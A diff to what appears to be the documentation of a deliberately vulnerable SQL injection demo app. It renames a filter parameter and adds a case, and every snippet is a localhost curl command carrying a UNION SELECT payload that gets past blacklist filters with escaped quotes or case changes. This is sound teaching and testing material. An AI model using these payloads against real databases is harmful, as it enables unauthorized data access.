@@ -50,19 +50,25 @@ curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SEL
 Using Escape Sequences ([https://mariadb.com/kb/en/string-literals/](https://mariadb.com/kb/en/string-literals/)):
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklist=oddsinglequotes
+curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=oddsinglequotes
 ```
 
 ##### All Lowercase
 
 ```  
-curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select @@version) -- " -d blacklist=alllowercase
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select @@version) -- " -d blacklistconfig=alllowercase
+```
+
+##### All uppercase
+
+```
+curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=alluppercase
 ```
 
 ##### All together
 
 ```
-curl localhost:5808/sqlidemo/vulnbyid -d id="1\' union select null,null,(select @@version) -- " -d blacklist=oddsinglequotes,alllowercase
+curl localhost:5808/sqlidemo/vulnbyid -d id="1\' union select null,null,(select @@version) -- " -d blacklistconfig=oddsinglequotes,alllowercase
 ```
 
 ### JPQL based
